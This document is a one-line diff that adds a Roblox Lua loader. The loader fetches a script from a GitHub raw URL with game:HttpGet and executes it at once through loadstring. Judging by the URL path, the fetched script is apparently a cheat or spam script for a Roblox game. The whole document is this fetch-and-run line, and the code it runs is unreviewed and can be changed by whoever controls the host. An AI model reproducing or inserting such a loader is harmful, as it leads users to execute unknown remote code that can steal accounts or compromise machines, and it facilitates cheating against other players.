@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/slayers-2-spam1-ikw110i5gvtpss.lua"))()
